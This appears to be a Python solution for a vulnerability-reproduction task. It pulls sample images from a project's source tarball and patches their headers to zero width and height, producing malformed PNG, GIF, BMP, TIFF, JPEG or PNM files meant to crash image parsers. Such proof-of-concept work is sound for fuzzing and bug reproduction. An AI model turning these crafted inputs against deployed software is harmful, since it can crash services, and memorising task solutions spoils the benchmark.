import io
import os
import struct
import tarfile
import zipfile
import binascii
import zlib


TARGET_FORMATS = {"png", "gif", "bmp", "tiff", "jpeg", "pnm"}


def identify_format(data: bytes):
    if not data or len(data) < 4:
        return None
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "png"
    if data.startswith((b"GIF87a", b"GIF89a")):
        return "gif"
    if data.startswith(b"BM"):
        return "bmp"
    if data.startswith((b"II*\x00", b"MM\x00*")):
        return "tiff"
    if data[:2] == b"\xff\xd8":
        return "jpeg"
    if (
        len(data) >= 3
        and data[0:1] == b"P"
        and data[1:2] in b"123456"
        and data[2:3] in b" \t\r\n\f\v"
    ):
        return "pnm"
    return None


def process_zip_bytes(zip_bytes: bytes, sample_by_format: dict):
    try:
        zf = zipfile.ZipFile(io.BytesIO(zip_bytes))
    except Exception:
        return
    try:
        for zinfo in zf.infolist():
            if zinfo.is_dir():
                continue
            if TARGET_FORMATS.issubset(sample_by_format.keys()):
                break
            try:
                data = zf.read(zinfo)
            except Exception:
                continue
            fmt = identify_format(data)
            if fmt and fmt not in sample_by_format:
                sample_by_format[fmt] = data
    finally:
        try:
            zf.close()
        except Exception:
            pass


def gather_samples_from_tar(src_path: str):
    sample_by_format = {}
    image_exts = (
        ".png",
        ".gif",
        ".bmp",
        ".jpg",
        ".jpeg",
        ".webp",
        ".tif",
        ".tiff",
        ".pnm",
        ".ppm",
        ".pgm",
        ".pbm",
        ".ico",
        ".cur",
    )
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return sample_by_format

    try:
        for member in tf.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()

            # Process zip seed corpora
            if name_lower.endswith(".zip"):
                try:
                    f = tf.extractfile(member)
                    if not f:
                        continue
                    zip_bytes = f.read()
                    process_zip_bytes(zip_bytes, sample_by_format)
                except Exception:
                    continue
                if TARGET_FORMATS.issubset(sample_by_format.keys()):
                    break
                continue

            # Heuristics: only look at likely sample/image files
            process = False
            if name_lower.endswith(image_exts):
                process = True
            else:
                for key in (
                    "corpus",
                    "seed",
                    "test",
                    "fuzz",
                    "input",
                    "image",
                    "img",
                    "sample",
                    "example",
                ):
                    if key in name_lower:
                        process = True
                        break
            if not process:
                continue

            try:
                f = tf.extractfile(member)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue

            fmt = identify_format(data)
            if fmt and fmt not in sample_by_format:
                sample_by_format[fmt] = data
                if TARGET_FORMATS.issubset(sample_by_format.keys()):
                    break
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return sample_by_format


def mutate_png_zero_dim(png: bytes):
    if not png.startswith(b"\x89PNG\r\n\x1a\n"):
        return None
    if len(png) < 33:
        return None
    try:
        length = struct.unpack(">I", png[8:12])[0]
    except Exception:
        return None
    if length < 8:
        return None
    if png[12:16] != b"IHDR":
        return None
    data_off = 16
    data_end = data_off + length
    if data_end + 4 > len(png):
        return None

    new = bytearray(png)
    # Set both width and height to zero
    new[data_off : data_off + 4] = b"\x00\x00\x00\x00"
    new[data_off + 4 : data_off + 8] = b"\x00\x00\x00\x00"

    chunk_type_and_data = new[12:data_end]
    crc_val = binascii.crc32(chunk_type_and_data) & 0xFFFFFFFF
    new[data_end : data_end + 4] = struct.pack(">I", crc_val)
    return bytes(new)


def mutate_gif_zero_dim(gif: bytes):
    if len(gif) < 10 or not (
        gif.startswith(b"GIF87a") or gif.startswith(b"GIF89a")
    ):
        return None
    new = bytearray(gif)
    # Logical Screen Width and Height are 16-bit little-endian at offsets 6 and 8
    new[6:8] = b"\x00\x00"
    new[8:10] = b"\x00\x00"
    return bytes(new)


def mutate_bmp_zero_dim(bmp: bytes):
    if len(bmp) < 26 or not bmp.startswith(b"BM"):
        return None
    if len(bmp) < 18:
        return None
    try:
        header_size = struct.unpack("<I", bmp[14:18])[0]
    except Exception:
        return None

    new = bytearray(bmp)
    if header_size >= 16:
        # Assume BITMAPINFOHEADER or similar with 32-bit width/height
        width_off = 14 + 4
        height_off = width_off + 4
        if height_off + 4 > len(new):
            return None
        new[width_off : width_off + 4] = b"\x00\x00\x00\x00"
        new[height_off : height_off + 4] = b"\x00\x00\x00\x00"
        return bytes(new)
    return None


def mutate_tiff_zero_dim(data: bytes):
    if len(data) < 8:
        return None
    endian = data[:2]
    if endian == b"II":
        u16 = lambda b: struct.unpack("<H", b)[0]
        u32 = lambda b: struct.unpack("<I", b)[0]
        p32 = lambda v: struct.pack("<I", v)
    elif endian == b"MM":
        u16 = lambda b: struct.unpack(">H", b)[0]
        u32 = lambda b: struct.unpack(">I", b)[0]
        p32 = lambda v: struct.pack(">I", v)
    else:
        return None

    try:
        magic = u16(data[2:4])
    except Exception:
        return None
    if magic != 42:
        return None
    try:
        ifd_offset = u32(data[4:8])
    except Exception:
        return None
    if ifd_offset + 2 > len(data):
        return None

    new = bytearray(data)
    try:
        num_entries = u16(data[ifd_offset : ifd_offset + 2])
    except Exception:
        return None

    changed = False
    for i in range(num_entries):
        entry_off = ifd_offset + 2 + i * 12
        if entry_off + 12 > len(data):
            break
        tag = u16(data[entry_off : entry_off + 2])
        if tag not in (256, 257):  # ImageWidth, ImageLength
            continue
        type_ = u16(data[entry_off + 2 : entry_off + 4])
        count = u32(data[entry_off + 4 : entry_off + 8])
        value_off = entry_off + 8
        if count != 1:
            continue
        if type_ == 3 or type_ == 4:  # SHORT or LONG, inline
            new[value_off : value_off + 4] = p32(0)
            changed = True
    if changed:
        return bytes(new)
    return None


SOF_MARKERS = {
    0xC0,
    0xC1,
    0xC2,
    0xC3,
    0xC5,
    0xC6,
    0xC7,
    0xC9,
    0xCA,
    0xCB,
    0xCD,
    0xCE,
    0xCF,
}


def mutate_jpeg_zero_dim(data: bytes):
    if len(data) < 4 or data[:2] != b"\xff\xd8":
        return None
    new = bytearray(data)
    i = 2
    n = len(new)

    while i < n:
        # Find marker prefix
        if new[i] != 0xFF:
            i += 1
            continue
        # Skip fill bytes
        while i < n and new[i] == 0xFF:
            i += 1
        if i >= n:
            break
        marker = new[i]
        i += 1

        if marker in (0xD8, 0xD9):  # SOI, EOI
            continue
        if marker == 0xDA:  # Start of Scan - image data follows
            break
        if i + 2 > n:
            break
        length = (new[i] << 8) | new[i + 1]
        i += 2
        if length < 2 or i + length - 2 > n:
            break

        if marker in SOF_MARKERS:
            sof_start = i
            if length >= 7 and sof_start + 5 <= n:
                height_off = sof_start + 1
                width_off = sof_start + 3
                new[height_off : height_off + 2] = b"\x00\x00"
                new[width_off : width_off + 2] = b"\x00\x00"
                return bytes(new)
        i += length - 2
    return None


def mutate_pnm_zero_dim(data: bytes):
    if len(data) < 3 or data[0:1] != b"P" or data[1:2] not in b"123456":
        return None
    if data[2:3] not in b" \t\r\n\f\v":
        return None

    n = len(data)
    i = 2
    tokens = []

    ws = b" \t\r\n\f\v"

    while i < n and len(tokens) < 2:
        # Skip whitespace
        while i < n and data[i:i + 1] in ws:
            i += 1
        if i >= n:
            break
        # Skip comments
        if data[i] == ord("#"):
            while i < n and data[i] not in (10, 13):  # '\n', '\r'
                i += 1
            continue
        start = i
        while i < n and data[i:i + 1] not in ws:
            i += 1
        end = i
        tokens.append((start, end))

    if len(tokens) < 2:
        return None

    new = bytearray(data)
    for start, end in tokens:
        for j in range(start, end):
            if 48 <= new[j] <= 57:  # '0'-'9'
                new[j] = ord("0")
    return bytes(new)


def create_simple_png_rgb_1x1():
    width = 1
    height = 1
    bit_depth = 8
    color_type = 2  # Truecolor (RGB)
    # Single scanline: filter byte (0) + one RGB pixel (255,0,0)
    raw_data = bytes([0, 255, 0, 0])
    compressed = zlib.compress(raw_data)

    def png_chunk(chunk_type: bytes, chunk_data: bytes) -> bytes:
        length = struct.pack(">I", len(chunk_data))
        crc = struct.pack(
            ">I", binascii.crc32(chunk_type + chunk_data) & 0xFFFFFFFF
        )
        return length + chunk_type + chunk_data + crc

    signature = b"\x89PNG\r\n\x1a\n"
    ihdr_data = (
        struct.pack(">I", width)
        + struct.pack(">I", height)
        + bytes([bit_depth, color_type, 0, 0, 0])
    )
    ihdr = png_chunk(b"IHDR", ihdr_data)
    idat = png_chunk(b"IDAT", compressed)
    iend = png_chunk(b"IEND", b"")
    return signature + ihdr + idat + iend


def generate_default_png_poc():
    base = create_simple_png_rgb_1x1()
    mutated = mutate_png_zero_dim(base)
    if mutated:
        return mutated
    return base


class Solution:
    def solve(self, src_path: str) -> bytes:
        sample_by_format = gather_samples_from_tar(src_path)

        mutate_funcs = {
            "png": mutate_png_zero_dim,
            "gif": mutate_gif_zero_dim,
            "bmp": mutate_bmp_zero_dim,
            "tiff": mutate_tiff_zero_dim,
            "jpeg": mutate_jpeg_zero_dim,
            "pnm": mutate_pnm_zero_dim,
        }

        # Prefer using real samples from the project, in an order of
        # formats where zero-dimension issues are common.
        for fmt in ("png", "gif", "tiff", "bmp", "jpeg", "pnm"):
            sample = sample_by_format.get(fmt)
            if not sample:
                continue
            mutator = mutate_funcs.get(fmt)
            if not mutator:
                continue
            try:
                mutated = mutator(sample)
            except Exception:
                mutated = None
            if mutated:
                return mutated

        # Fallback: synthesize a minimal PNG with zero dimensions
        return generate_default_png_poc()